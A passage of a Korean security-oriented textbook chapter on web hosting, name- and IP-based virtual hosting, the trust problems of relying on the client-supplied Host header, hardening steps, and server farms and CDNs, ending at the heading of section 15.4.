# 15장. 호스팅, 가상 호스트, 리다이렉션, 로드 밸런싱

> **이 장에서 다루는 것**
>
> - 하나의 서버가 여러 사이트를 얹을 때, 어느 사이트인지를 무엇이 결정하는가
> - `Host` 헤더 의존이 만든 구조 — 목적지를 정하는 근거가 클라이언트가 보낸 값이라는 사실
> - 메시지의 최종 목적지를 바꾸는 기법들이 어느 계층에서 동작하며, 클라이언트가 그것을 아는가
> - 공유 호스팅과 ASP 환경에서 테넌트 격리가 실패하는 지점
> - 계층으로 나눈 아키텍처에서 계층 사이의 신뢰가 깨지는 방식과 그것을 좁히는 방법
> - HTTP 위에 얹힌 저작 채널 — FrontPage 서버 확장과 WebDAV — 이 열람 채널과 무엇이 다른가

12장은 웹 서버 하나를, 13장은 중간자를, 14장은 캐시를 각각 하나의 주체로 놓고 그 내부를 열었다. 세 장 모두 **"이 메시지가 여기 도착했다"** 를 전제로 시작했다. 이 장은 그 전제를 다룬다. 메시지가 왜 하필 그곳에 도착했는가, 그리고 도착한 곳에서 그것이 누구의 요청으로 취급되는가.

이 질문은 두 갈래로 나뉜다. 하나는 **얹기**의 문제다. 하나의 물리 서버, 하나의 IP 주소, 하나의 프로세스, 하나의 데이터베이스 위에 여러 사이트·여러 고객·여러 계층이 함께 올라간다. 그러면 그것들을 서로 구별하는 근거가 필요해진다. 다른 하나는 **보내기**의 문제다. 클라이언트가 이름 하나를 적었을 뿐인데 그 요청은 20대의 서버 중 하나, 혹은 클라이언트가 존재조차 모르는 캐시로 간다. 그 선택을 누가, 어느 계층에서, 무엇을 근거로 하는가.

두 갈래는 같은 구조를 공유한다. **구별의 근거와 선택의 근거가 어디에서 오는가.** 가상 호스팅에서 그 근거는 클라이언트가 요청 헤더에 적어 보낸 문자열이다. 공유 호스팅에서 그 근거는 파일 시스템 경로와 운영체제 계정이다. DNS 라운드로빈에서는 이름 해석의 결과이고, WCCP에서는 라우터의 해시 값이며, WPAD에서는 로컬 네트워크의 누군가가 보낸 DHCP 응답이다. 각각이 얼마나 위조하기 어려운가가 곧 그 구조의 강도다.

이 장은 그래서 두 개의 큰 덩어리로 되어 있다. 15.1~15.3절과 15.9~15.11절은 **얹기**를 — 호스팅의 형태, 가상 호스팅, 공유 환경, 계층 아키텍처, 그리고 콘텐츠를 얹는 발행 시스템을 — 다룬다. 15.4~15.8절은 **보내기**를 — 리다이렉션과 로드 밸런싱의 기법 전체를 — 다룬다. 두 덩어리를 잇는 문장은 15.2절에 있다.

## 15.1 호스팅 서비스의 형태

리소스를 공개 웹 서버에 올린다는 것은 그것을 인터넷 커뮤니티에 제공한다는 뜻이다. 그 리소스는 텍스트 파일이나 이미지처럼 단순할 수도 있고, 실시간 지도나 전자상거래 게이트웨이처럼 복잡할 수도 있다. **콘텐츠 리소스를 저장하고, 중개하고, 관리하는 일 전체를 웹 호스팅(web hosting)이라 한다.** 호스팅은 웹 서버의 일차적 기능 중 하나다. 콘텐츠를 담고, 서비스하고, 접근을 로깅하고, 관리할 서버가 필요하다.

웹 초창기에는 각 조직이 하드웨어를 사고, 전산실을 짓고, 회선을 확보하고, 서버 소프트웨어를 직접 운영했다. 웹이 주류가 되자 모두가 웹 사이트를 원했지만 공조 설비를 갖춘 서버실을 만들거나 도메인을 등록하거나 대역폭을 구매할 기술과 시간을 가진 사람은 적었다. 그 공백을 메우며 **호스팅 사업자(hoster)** 가 등장했다. 제공하는 서비스의 폭은 넓다. 공간·공조·배선만 제공하는 물리 설비 관리부터, 고객은 콘텐츠만 넘기면 되는 완전 관리형 호스팅까지 있다.

### 전용 호스팅

가장 단순한 형태다. Joe's Hardware Online과 Mary's Antique Auction이 각각 상당한 트래픽의 사이트를 원한다고 하자. Irene's ISP는 동일한 고성능 웹 서버를 랙 단위로 갖고 있고, 그것을 Joe와 Mary에게 임대한다. Joe는 Irene's ISP가 구매하고 관리하는 전용 웹 서버 한 대를 빌리고, Mary는 다른 한 대를 빌린다. Irene's ISP는 서버 하드웨어를 대량으로 구매해 신뢰성 있고 검증된 저비용 기종을 고를 수 있고, 어느 쪽 사이트가 인기를 얻으면 즉시 서버를 추가로 공급할 수 있다.

이 구성에서 브라우저는 `www.joes-hardware.com`에 대한 요청을 Joe의 서버 IP 주소로, `www.marys-antiques.com`에 대한 요청을 Mary의 (다른) 서버 IP 주소로 보낸다. **구별의 근거가 IP 주소이며, 그 근거는 라우팅과 이름 해석이 만든다.** 클라이언트가 임의로 정할 수 없다. 실제로 그 주소로 패킷이 도달해야 하기 때문이다.

### 가상 호스팅(공유 호스팅)

웹에 존재는 갖고 싶지만 트래픽은 많지 않은 경우가 훨씬 흔하다. 이들에게 전용 서버는 낭비다. 대부분 놀고 있는 서버에 매달 수백 달러를 내는 셈이기 때문이다.

그래서 많은 호스팅 사업자가 **한 대의 컴퓨터를 여러 고객이 나눠 쓰는** 저비용 서비스를 제공한다. 이것을 **공유 호스팅(shared hosting)** 또는 **가상 호스팅(virtual hosting)** 이라 한다. 각 웹 사이트는 서로 다른 서버가 호스팅하는 것처럼 보이지만 실제로는 같은 물리 서버 위에 있다. **최종 사용자의 관점에서 가상 호스팅된 사이트는 전용 서버에 올라간 사이트와 구별되지 않아야 한다.**

비용·공간·관리의 이유로 가상 호스팅 사업자는 같은 서버에 수십, 수백, 수천 개의 사이트를 얹으려 한다. 그렇다고 1,000개 사이트가 PC 한 대에서 서비스된다는 뜻은 아니다. 사업자는 복제된 서버 뱅크 — **서버 팜(server farm)** — 를 만들고 부하를 그 팜 전체에 분산한다. 팜의 각 서버가 서로의 복제본이고 각각이 다수의 가상 사이트를 얹고 있으므로 관리가 훨씬 쉬워진다(15.3절).

### 애플리케이션 서비스 제공자

호스팅의 스펙트럼은 여기서 끝나지 않는다. WAHH가 정리하는 바에 따르면, 조직이 외부 제공자를 쓰는 방식은 **웹 서버나 데이터베이스 서버에 대한 접근만 제공받는 단순 호스팅**부터 **조직을 대신해 애플리케이션 자체를 능동적으로 유지·보수하는 애플리케이션 서비스 제공자(application service provider, ASP)** 까지 걸쳐 있다. 이런 방식은 자체 애플리케이션을 배포할 기술이나 자원이 없는 소규모 사업자에게 이상적이지만, 일부 고인지도 기업도 특정 애플리케이션에 대해서는 이 방식을 쓴다.

**표 15-1. 호스팅 형태와 격리의 단위**

| 형태 | 공유되는 것 | 사이트를 구별하는 근거 | 그 근거를 통제하는 주체 | 격리의 단위 |
|---|---|---|---|---|
| 전용 호스팅 | 없음 (설비·회선만) | 목적지 IP 주소 | 라우팅·이름 해석 | 물리 호스트 |
| IP 기반 가상 호스팅 | 물리 호스트, OS | 커넥션의 목적지 IP | 라우팅·이름 해석 | docroot, OS 계정 |
| 이름 기반 가상 호스팅 | 물리 호스트, OS, IP 주소 | **`Host` 요청 헤더** | **클라이언트** | docroot, OS 계정 |
| 공유 호스팅 (스크립트 업로드 허용) | 위의 모든 것 + 실행 환경 | `Host` 헤더 | 클라이언트 | OS 계정, DB 계정 |
| ASP (공유 애플리케이션) | 위의 모든 것 + 애플리케이션 코드·DB 스키마·로그 | 애플리케이션 내부의 테넌트 식별자 | 애플리케이션 | 애플리케이션 로직 |

*표 15-1은 HTTP-DG 18장의 호스팅 형태 분류와 WAHH 17장의 공유 환경 서술을 이 책의 관점에서 결합한 것이다.*

표를 아래로 읽으면 **공유되는 것이 늘어나고, 격리의 단위가 하드웨어에서 소프트웨어로, 다시 애플리케이션 로직으로 내려간다.** 이 하강이 이 장 전체의 축이다. 격리를 담당하는 층이 아래일수록 그것을 깨기 어렵고, 위로 올라올수록 하나의 버그로 무너진다. 표의 세 번째 행에서 구별의 근거가 클라이언트 손으로 넘어가는 것이 15.2절의 주제이고, 네 번째·다섯 번째 행에서 격리가 실패하는 방식이 15.9절의 주제다.

## 15.2 가상 호스팅 — Host 헤더 의존과 그 위험

이 절에는 여러 장의 실이 모인다. 2.9절은 호스트명 기반 가상 호스팅의 전제를 이름 해석 쪽에서 서술했고, 8.6절은 `Host`를 신뢰할 수 없는 헤더의 목록에 넣었으며, 12.4.1절은 docroot 선택의 입력이 `Host`라는 사실을, 12.9절은 그 선택이 기본 호스트에서 어긋나는 오설정을, 13.5절은 프록시 요청에서 목적지가 두 곳에 실린다는 사실을 각각 다뤘다. 이 절은 그것들을 하나의 구조로 놓고 정면으로 본다.

### 15.2.1 빠진 정보와 네 가지 우회

HTTP/1.0에는 가상 호스팅 사업자를 괴롭힌 설계 결함이 있었다. **명세가 공유 웹 서버에게 "지금 접근되고 있는 가상 사이트가 어느 것인지" 식별할 수단을 전혀 주지 않았다.**

HTTP/1.0 요청은 URL의 경로 컴포넌트만 보낸다. `http://www.joes-hardware.com/index.html`을 가져오려 하면 브라우저는 `www.joes-hardware.com`에 접속하지만, 요청 메시지에는 호스트명 언급 없이 `GET /index.html`만 실린다. 서버가 여러 사이트를 얹고 있다면 이 정보로는 어느 사이트인지 알 수 없다.

```
(클라이언트 A가 http://www.joes-hardware.com/index.html 을 가져올 때)
GET /index.html HTTP/1.0
User-Agent: SuperBrowser v1.3

(클라이언트 B가 http://www.marys-antiques.com/index.html 을 가져올 때)
GET /index.html HTTP/1.0
User-Agent: WebSurfer 2000
```

*예제 15-1. 호스트 정보가 없는 HTTP/1.0 요청 두 개 (HTTP-DG 그림 18-3 기준)*

**두 요청은 완전히 다른 사이트의 서로 다른 문서를 원하지만 바이트 단위로 구별할 수 없다.** 웹 사이트 호스트 정보가 요청에서 제거되어 버렸기 때문이다. 6장이 다룬 서러게이트(리버스 프록시)와 인터셉팅 프록시도 같은 이유로 사이트 지정 정보를 필요로 한다(→ 13.5).

이 누락은 원래 명세의 실수였고, 그 실수는 **각 웹 서버가 정확히 하나의 웹 사이트를 호스팅할 것이라는 잘못된 가정**에서 나왔다. 그 가정 아래에서 URL의 호스트명은 중복 정보였다. 문제는 모든 HTTP 요청이 경로가 아니라 전체 URL을 보내도록 요구하면 간단히 풀렸을 것이고, HTTP/1.1은 실제로 서버가 요청 라인의 전체 URL을 처리할 것을 요구한다. 그러나 배포된 구현이 전부 갱신되기까지는 오랜 시간이 걸린다. 그 사이에 네 가지 기법이 나왔다.

**표 15-2. 가상 호스팅 네 기법 (HTTP-DG 18장 기준, 평가 열은 이 책의 정리)**

| 기법 | 사이트를 결정하는 값 | 원서의 평가 | 이 책의 관점에서의 성질 |
|---|---|---|---|
| URL 경로 | 요청 라인의 경로 접두 (`/joe/`, `/mary/`) | 접두가 중복이고 혼란스러우며 `http://호스트/`로 홈페이지에 접근하는 관행이 깨진다. 좋지 않은 해법이고 거의 쓰이지 않는다 | 클라이언트가 통제 |
| 포트 번호 | 목적지 포트 (Joe는 82, Mary는 83) | 사용자는 URL에 비표준 포트를 적지 않고 리소스를 찾기를 기대한다. 같은 문제 | 클라이언트가 통제 (커넥션 대상) |
| IP 주소 | 커넥션의 목적지 IP | **훨씬 나은 접근이고 널리 쓰인다.** 다만 한 기계에 붙일 수 있는 가상 IP 수에 한계가 있고, IP는 희소 자원이며, 용량을 위해 서버를 복제하면 필요 IP가 복제 대수만큼 배가된다 | **라우팅·이름 해석이 통제. 위조가 매우 어렵다** |
| `Host` 헤더 | 요청 헤더의 문자열 | 주소 소비와 가상 IP 한계를 피하면서 사이트를 구별한다. 호스팅 사업자들의 압력으로 도입됐다 | **클라이언트가 통제** |

IP 주소 기법이 어떻게 동작하는지 구체적으로 보자. 사업자가 `www.joes-hardware.com`에 209.172.34.3을, `www.marys-antiques.com`에 209.172.34.4를 배정하고 두 주소를 같은 물리 서버에 묶는다. 클라이언트 A가 `www.joes-hardware.com`의 주소로 209.172.34.3을 얻고 그 주소로 TCP 커넥션을 열어 `GET /index.html HTTP/1.0`을 보내면, 서버는 응답을 만들기 전에 **실제 목적지 IP 주소가 209.172.34.3이라는 사실**을 확인하고 그것이 Joe의 가상 IP임을 판정해 `/joe` 서브디렉터리에서 요청을 처리한다. `/joe/index.html`이 반환된다.

`Host` 헤더 기법은 같은 문제를 다르게 푼다. 전체 URL을 보내는 방식은 경로만 받기를 기대하는 많은 서버를 깨뜨릴 것이므로, 호스트명(과 포트)을 **모든 요청에 붙는 확장 헤더**로 전달한다.

```
GET /index.html HTTP/1.1
User-Agent: SuperBrowser v1.3
Host: www.joes-hardware.com
```

*예제 15-2. `Host` 헤더가 가상 호스트 요청을 구별한다 (HTTP-DG 그림 18-5 기준)*

`Host` 헤더는 HTTP/1.0의 벤더 확장 상위집합인 HTTP/1.0+에서 처음 도입됐고 **HTTP/1.1 준수에는 필수**다. 대부분의 현대 브라우저와 서버가 지원하지만 지원하지 않는 클라이언트·서버·로봇이 소수 남아 있다.

### 15.2.2 `Host` 헤더의 규칙

`Host`는 RFC 2068이 정의한 HTTP/1.1 요청 헤더다. 가상 서버가 워낙 흔해서 HTTP/1.1을 준수하지 않는 클라이언트도 대개 이 헤더를 구현한다.

```
Host = "Host" ":" host [ ":" port ]
```

명세가 요구하는 사항을 모아 보면 다음과 같다. 각 항목 옆에 그것이 무엇을 전제하는지를 붙였다.

**표 15-3. `Host` 헤더에 대한 명세의 요구 (HTTP-DG 18장 기준)**

| 요구 사항 | 무엇을 전제하는가 |
|---|---|
| 포트가 없으면 스킴의 기본 포트로 간주한다 | 같은 이름이 포트 유무에 따라 두 문자열이 된다 |
| URL이 IP 주소를 담고 있으면 `Host`도 같은 주소를 담아야 한다 | — |
| URL이 호스트명을 담고 있으면 `Host`는 **같은 이름**을 담아야 한다 | 클라이언트의 성실한 협조 |
| URL이 호스트명을 담고 있을 때 `Host`에 그 호스트명의 IP 등가물을 담아서는 안 된다 | 그렇게 하면 하나의 IP에 여러 사이트를 얹은 서버가 깨진다 |
| URL이 호스트명을 담고 있을 때 `Host`에 그 이름의 다른 별칭을 담아서는 안 된다 | 같은 이유 |
| 클라이언트가 명시적 프록시를 쓰면 `Host`에는 **프록시가 아니라 원 서버**의 이름과 포트를 담아야 한다 | 과거 여러 웹 클라이언트가 프록시 설정 시 `Host`에 프록시 호스트명을 넣는 버그가 있었고, 이 잘못된 동작은 프록시와 원 서버 양쪽을 오작동시킨다 |
| 클라이언트는 **모든 요청 메시지에** `Host`를 포함해야 한다 | — |
| 웹 프록시는 요청을 전달하기 전에 `Host`를 **추가해야** 한다 | 프록시가 값을 만들어 넣을 수 있다는 뜻 |
| HTTP/1.1 서버는 `Host`가 없는 HTTP/1.1 요청에 **400**으로 응답해야 한다 | — |

이 목록에서 다섯 개 항목이 "~해야 한다 / ~해서는 안 된다" 형태로 **클라이언트에게 요구**한다는 점을 보라. 명세는 클라이언트가 정직하게 협조할 것을 전제로 쓰여 있다. 그 전제가 지켜지지 않을 때 무슨 일이 생기는지가 이 절의 후반부다.

### 15.2.3 서버는 `Host`를 어떻게 해석하는가

가상 호스팅을 하지 않고 요청된 호스트에 따라 리소스가 달라지지 않는 원 서버는 `Host` 값을 무시해도 된다. 그러나 호스트에 따라 리소스를 구별하는 서버는 다음 규칙을 따라야 한다.

1. HTTP 요청 메시지의 URL이 **절대 URI**(스킴과 호스트 컴포넌트를 포함)이면, `Host` 헤더의 값은 무시하고 **URL을 따른다.**
2. URL에 호스트가 없고 요청에 `Host` 헤더가 있으면, 호스트/포트를 `Host` 헤더에서 얻는다.
3. 1과 2로 유효한 호스트를 결정할 수 없으면 **400 Bad Request**를 반환한다.

**이 세 줄이 이 책의 관심사에서 가장 중요한 대목이다.** 하나의 사실 — 이 요청의 목적지 사이트는 무엇인가 — 에 대해 메시지 안에 **두 개의 독립적인 출처**가 있고, 명세는 그 둘의 우선순위를 정해 두었다. 우선순위가 있다는 것은 곧 **둘이 다를 수 있다는 것을 명세가 인정한다**는 뜻이다.

13.5절이 프록시 요청 형식을 다루며 도달한 결론이 여기서 다시 나타난다. 명시적 프록시는 요청 라인에 전체 URI를 요구하는 것으로 목적지 문제를 풀었고, 가상 호스팅 서버는 `Host` 헤더로 풀었다. 두 해법이 하나의 메시지에 동시에 존재할 수 있다. 그리고 경로 위의 홉마다 자기 구현이 규칙 1을 따르는지 규칙 2를 따르는지가 다를 수 있다. **13.12절이 열거한 파싱 불일치 지점 중 하나가 정확히 이것이다.**

`Host`가 아예 없는 요청도 있다. 헤더를 보내지 않는 오래된 브라우저가 소수 남아 있고, 가상 호스팅 서버가 `Host`로 사이트를 결정하는데 헤더가 없으면 대개 **기본 웹 페이지**(예: ISP 자신의 페이지)로 보내거나 브라우저를 업그레이드하라는 오류 페이지를 반환한다. 12.9절이 다룬 오설정 — 보안 설정이 특정 가상 호스트에만 걸리고 기본 호스트에는 걸리지 않는 것 — 이 성립하는 자리가 바로 이 "기본"이다.

### 15.2.4 구조: 목적지를 정하는 근거가 클라이언트가 보낸 값이다

표 15-2의 마지막 두 행을 나란히 놓자.

- **IP 기반 가상 호스팅**에서 사이트 결정의 입력은 **커넥션의 목적지 IP 주소**다. 클라이언트가 그 값을 임의로 쓸 수 없다. 실제로 그 주소로 패킷이 도달해야 하고, 응답을 받으려면 그 주소에서 돌아오는 경로 위에 있어야 한다. 이것은 **위조에 비용이 드는 근거**다.
- **이름 기반 가상 호스팅**에서 사이트 결정의 입력은 **요청 메시지 안의 텍스트**다. 클라이언트는 무엇이든 쓸 수 있다. 이것은 **위조에 비용이 들지 않는 근거**다.

오늘날 표준이 된 것은 후자다. 주소 소비 문제 때문에 산업 전체가 그쪽을 택했고, 그 선택의 대가로 **목적지를 정하는 권한이 클라이언트가 보낸 문자열로 옮겨 갔다.** 이 문장은 이 책이 반복해서 꺼내는 형태다. 8.6절이 `Referer`·`X-Forwarded-For`·`User-Agent`에 대해 말한 것과 같은 종류이되, 그 셋은 대개 **부가 정보**인 반면 `Host`는 **요청 처리의 골격을 결정하는 값**이라는 점에서 무겁다.

결과는 다섯 방향으로 퍼진다.

**첫째, 어느 사이트로 라우팅되는가.** 서버와 프록시는 `Host` 값으로 어느 docroot, 어느 백엔드, 어느 설정 블록을 쓸지 정한다(→ 12.4.1). 이 값이 검증되지 않으면 클라이언트는 **가장 약하게 설정된 뷰를 선택할 수 있다.** 12.9절이 서술한 네 가지 시험 — 올바른 `Host`, 임의의 `Host`, IP 주소를 담은 `Host`, `Host` 없음 — 은 이 선택권을 실제로 행사해 보는 절차다.

**둘째, 서버가 만드는 절대 URL을 클라이언트가 통제한다.** 서버가 자기 절대 URL을 생성해야 하는 자리는 많다. `Location` 헤더, 페이지 안의 링크, 메일로 나가는 링크가 그렇다. 많은 구현이 그 URL의 권위(authority) 부분을 `Host` 값에서 그대로 가져온다. 그러면 클라이언트가 보낸 문자열이 서버가 생성하는 URL에 들어간다. 인프라 리다이렉션(15.6절)이 `Location`을 만들 때도 같은 경로를 밟을 수 있다.

**셋째, 캐시 키가 흔들린다.** 공유 캐시는 `Host`를 캐시 키의 일부로 쓴다(→ 14.8). 두 개의 서로 다른 `Host` 문자열이 서버에서는 같은 사이트로 정규화되고 캐시에서는 다른 항목으로 취급되면, 혹은 그 반대이면, 14.8절이 서술한 **동등성 판정의 어긋남**이 성립한다. 포트 유무, 대소문자, 후행 점 같은 사소한 차이가 정규화 규칙의 차이로 나타난다.

**넷째, 두 출처의 불일치.** 15.2.3절의 규칙 1과 2가 만든 구조다. 절대 URI와 `Host`가 둘 다 있고 서로 다를 때, 어느 쪽을 쓰는지가 홉마다 다를 수 있다(→ 13.5, 13.12).

**다섯째, TLS에서는 이름이 두 곳에 실린다.** `Host`는 HTTP 헤더이고 HTTPS에서 HTTP 메시지는 TLS 안에 있다. 서버가 `Host`를 읽을 수 있는 시점은 핸드셰이크가 끝난 뒤인데, 어느 인증서를 제시할지는 핸드셰이크 도중에 정해야 한다. 이름을 핸드셰이크 안으로 옮긴 것이 SNI이고, 그 결과 같은 이름이 **핸드셰이크 안과 HTTP 헤더 안, 두 곳**에 실려 온다. 프로토콜상 둘이 같아야 할 이유는 없다(→ 18.6).

### 15.2.5 가상 호스팅의 강화

원리는 하나다. **클라이언트가 통제하는 값으로 분기한다는 사실을 받아들이고, 그 값의 허용 집합을 서버가 정한다.**

**1. 허용 호스트명을 명시적으로 열거한다.** 서비스하는 이름의 목록을 서버 설정에 두고, 그 목록에 없는 `Host` 값은 처리하지 않는다. 화이트리스트 방식이며, 이 책이 검증에 대해 일관되게 취하는 입장이다(→ 43.5).

**2. 기본 가상 호스트를 명시적으로 정의하고 아무것도 서비스하지 않게 한다.** 어느 이름에도 맞지 않는 요청이 도달했을 때 "첫 번째로 정의된 가상 호스트"로 조용히 떨어지는 것이 12.9절의 오설정을 만든다. 기본 호스트를 명시적으로 두되 그것이 콘텐츠를 내지 않고 오류로 닫히게 하면, 그 경로 전체가 사라진다.

**3. `Host` 없는 HTTP/1.1 요청은 400으로 닫는다.** 명세의 요구다. 이 규칙이 지켜지지 않으면 "기본 사이트"로 가는 두 번째 경로가 열린다.

**4. 서버가 생성하는 절대 URL의 권위는 설정값에서 가져온다.** `Host`에서 가져오지 않는다. 이 사이트의 정식 이름이 무엇인지는 운영자가 아는 사실이지 클라이언트가 알려 줄 사실이 아니다.

**5. 정규화 규칙을 경로 위에서 일치시킨다.** 프록시·캐시·서버가 `Host`를 같은 방식으로 정규화하는지 확인한다. 포트의 유무, 대소문자, 후행 점, 국제화 도메인 이름의 표현이 문제가 되는 지점이다.

**6. 격리가 필요한 곳에서는 이름이 아니라 주소로 나눈다.** 서로 다른 신뢰 수준의 사이트를 같은 IP에 얹지 않는다. IP 기반 분리는 주소를 소비하지만 **위조에 비용이 드는 근거**를 회복한다. 관리 인터페이스처럼 노출 자체가 위험한 것을 별도 주소·별도 포트에 두는 관행(→ 12.6)이 여기에 해당한다.

> **이 절이 뒷받침하는 것**
>
> - 사이트 결정의 입력이 클라이언트 통제 문자열이라는 사실 → **12.9** (기본 호스트 간과), **8.6** (헤더의 신뢰성)
> - 목적지가 절대 URI와 `Host` 두 곳에 실린다는 사실 → **13.5**, **13.12** (파싱 불일치 지점 목록)
> - `Host`가 캐시 키에 들어간다는 사실 → **14.8** (공유 캐시의 동등성 판정)
> - 이름이 핸드셰이크와 헤더 두 곳에 실린다는 사실 → **18.6** (SNI)
> - 서버가 생성하는 URL의 권위를 클라이언트가 통제한다는 사실 → **35.1** (헤더 인젝션), **35.3** (오픈 리다이렉션과의 구별은 15.4절)

## 15.3 사이트를 신뢰성 있게 만들기 / 빠르게 만들기

웹 사이트가 흔히 깨지는 시점은 셋이다.

- **서버 다운타임**
- **트래픽 급증** — 갑자기 모두가 특정 뉴스 방송을 보려 하거나 세일에 몰린다. 급작스러운 스파이크는 웹 서버를 과부하로 느리게 만들거나 완전히 멈추게 한다(14.1절이 다룬 flash crowd).
- **네트워크 장애와 손실**

### 15.3.1 미러 서버 팜

**서버 팜(server farm)** 은 서로를 대신할 수 있는, 동일하게 설정된 웹 서버의 뱅크다. 팜의 각 서버에 담긴 콘텐츠는 미러링될 수 있어서 한 대에 문제가 생기면 다른 한 대가 메운다.

미러 서버는 흔히 계층 관계를 이룬다. 한 대가 **콘텐츠 권위(content authority)** 역할을 한다. 원본 콘텐츠를 담고 있고, 콘텐츠 작성자가 게시하는 대상이 되는 서버다. 이것을 **마스터 원 서버(master origin server)** 라 한다. 마스터로부터 콘텐츠를 받는 미러 서버들을 **레플리카 원 서버(replica origin server)** 라 한다.

서버 팜을 배치하는 단순한 방법 하나는 **네트워크 스위치로 요청을 서버들에 분배하는 것**이다. 이때 서버들이 얹고 있는 각 웹 사이트의 IP 주소는 **스위치의 IP 주소**다. 외부 세계가 보는 주소는 하나이고, 그 뒤에서 스위치가 요청을 나눈다.

```
   클라이언트                                  레플리카 원 서버
   클라이언트  ──┐
                 │                        ┌──> [레플리카]
   클라이언트  ──┼──> 인터넷 ──> [스위치] ─┼──> [마스터 원 서버]
                 │                        └──> [레플리카]
   클라이언트  ──┘                              (마스터가 레플리카로 콘텐츠 전파)
```

*그림 15-1. 미러 서버 팜 (HTTP-DG 그림 18-6 기준)*

미러 서버는 지리적으로 분산될 수도 있다. 시카고에 마스터를 두고 뉴욕·마이애미·리틀록에 레플리카를 두는 구성이 그 예다. 마스터는 시카고 지역 클라이언트를 서비스하면서 동시에 콘텐츠를 레플리카로 전파하는 일을 맡는다. 이 구성에서 클라이언트 요청을 특정 서버로 유도하는 방법은 두 가지다.

- **HTTP 리다이렉션** — 콘텐츠의 URL이 마스터의 IP 주소로 해석되게 하고, 마스터가 레플리카로 리다이렉트를 보낸다.
- **DNS 리다이렉션** — 콘텐츠의 URL이 네 개의 IP 주소로 해석되게 하고, DNS 서버가 클라이언트에게 보낼 주소를 고른다.

두 방법의 상세가 15.6절이다.

### 15.3.2 콘텐츠 분산 네트워크

**콘텐츠 분산 네트워크(content distribution network, CDN)** 는 특정 콘텐츠의 분산을 목적으로 하는 네트워크다. 네트워크의 노드는 웹 서버일 수도, 서러게이트일 수도, 프록시 캐시일 수도 있다.

**서러게이트 캐시**는 그림 15-1의 레플리카 원 서버 자리를 대신할 수 있다. 서러게이트(리버스 프록시)는 미러 웹 서버와 마찬가지로 서버 요청을 받는다. 그것이 가능한 이유는 콘텐츠에 대한 IP 주소가 광고되는 방식에 있다. 대개 원 서버와 서러게이트 사이에는 협력 관계가 있고, 서러게이트는 특정 원 서버를 향한 요청을 받을 것으로 기대한다.

**서러게이트와 미러 서버의 차이는 수요 구동(demand-driven)이라는 점이다.** 서러게이트는 원 서버 콘텐츠의 전체 사본을 저장하지 않고, 자기 클라이언트가 요청한 것만 저장한다. 캐시에 콘텐츠가 어떻게 분포하는가는 받은 요청에 달려 있고, 원 서버가 그 콘텐츠를 갱신할 책임을 지지 않는다. 수요가 높은 "핫" 콘텐츠에 대한 접근을 위해 일부 서러게이트는 사용자 요청보다 앞서 콘텐츠를 끌어오는 **프리페칭(prefetching)** 기능을 갖는다. 서러게이트가 있는 CDN에는 복잡성이 하나 더해진다. **캐시 계층(cache hierarchy)** 이 생길 수 있다는 것이다(→ 14.3).

**프록시 캐시**도 유사한 구성으로 배치할 수 있다. 서러게이트와 달리 전통적 프록시 캐시는 **어떤 웹 서버를 향한 요청이든** 받을 수 있다. 프록시 캐시와 원 서버 사이에 협력 관계나 IP 주소 합의가 필요하지 않다. 서러게이트와 마찬가지로 프록시 캐시의 콘텐츠는 수요 구동이며 원 서버 콘텐츠의 정확한 복제가 아니다. 일부 프록시 캐시는 핫 콘텐츠를 미리 적재할 수 있다.

수요 구동 프록시 캐시는 또 다른 구성 — 특히 **인터셉션 구성** — 으로 배치될 수 있다. 2계층 또는 3계층 장비(스위치나 라우터)가 웹 트래픽을 가로채 프록시 캐시로 보내는 방식이다. 인터셉션 구성은 클라이언트와 서버 사이의 네트워크를 **적절한 HTTP 요청 전부가 물리적으로 캐시로 흐르도록** 구성할 수 있는가에 달려 있다. 그 기법이 15.6절과 15.8절이다.

### 15.3.3 빠르게 만들기

앞 절의 기술 상당수가 사이트를 빠르게 만드는 데도 기여한다. 서버 팜과 분산된 프록시 캐시·서러게이트는 네트워크 트래픽을 분산해 혼잡을 피한다. 콘텐츠를 분산하면 그것이 최종 사용자에게 가까워지므로 서버에서 클라이언트까지의 이동 시간이 줄어든다(→ 1.5.3). **리소스 접근 속도의 열쇠는 요청과 응답이 클라이언트와 서버 사이를 어떻게 오가도록 유도되는가에 있다.** 그것이 15.4절 이후의 주제다.

사이트를 빠르게 만드는 다른 접근은 **콘텐츠를 빠른 전송에 맞게 인코딩하는 것**이다. 수신 클라이언트가 압축을 풀 수 있다는 전제 아래 콘텐츠를 압축하는 것이 그 예다(→ 10장).

### 15.3.4 복제가 만드는 보안 문제

원서는 복제를 성능과 신뢰성의 문제로 다룬다. 이 책의 관심사에서는 세 가지가 추가된다.

**첫째, 설정의 일관성이 새로운 실패 지점이 된다.** 팜의 각 서버가 서로의 클론이라는 것은 관리가 쉽다는 뜻이지만, 동시에 **한 대만 다르면 그 한 대가 전체의 보안 수준을 결정한다**는 뜻이다. n대 중 하나만 패치되지 않았거나, 하나만 디렉터리 리스팅이 켜져 있거나, 하나만 기본 호스트가 열려 있으면, DNS 라운드로빈은 클라이언트를 언젠가 그 서버로 보낸다. 12장이 열거한 오설정 전체가 여기서 **"어느 한 대에서라도 참인가"** 라는 질문으로 바뀐다.

**둘째, 콘텐츠 권위로 가는 발행 경로가 공격 표면이다.** 마스터 원 서버는 정의상 모든 레플리카의 콘텐츠를 결정한다. 마스터에 쓸 수 있는 자는 전 사이트에 쓸 수 있다. 이 발행 경로를 HTTP 위에 올린 시스템이 15.11절의 주제이며, 12.7절이 다룬 `PUT`·`MOVE`의 위험이 여기서는 하나의 서버가 아니라 팜 전체의 문제가 된다.

**셋째, 상태를 가진 것은 복제되지 않는다.** 세션, 잠금, 요율 제한 카운터처럼 서버가 기억하는 것들은 클론들 사이에서 자동으로 공유되지 않는다. 그것을 공유하려고 만든 장치 — 공유 저장소, 스티키 세션, 상태를 클라이언트로 내보내는 토큰 — 각각이 별도의 신뢰 가정을 도입한다. 이 문제는 23장(세션 관리)과 46.3절(처리 인스턴스는 상태를 갖지 않는다)에서 각각 다룬다.

> **이 절이 뒷받침하는 것**
>
> - 팜과 미러가 요청 유도를 필요로 한다는 사실 → **15.4~15.8** (리다이렉션 기법 전체)
> - 인터셉션 구성이 캐시를 요청 경로에 놓는다는 사실 → **15.8** (WCCP), **14.8** (공유 캐시의 보안 함의)
> - 콘텐츠 권위로의 발행 경로 → **15.11** (발행 시스템)
> - 복제된 인스턴스의 설정 일관성 → **12.6**, **12.10** (서버 강화), **46.12** (설정 검증)

## 15.4 리다이렉션은 왜, 어디로 하는가

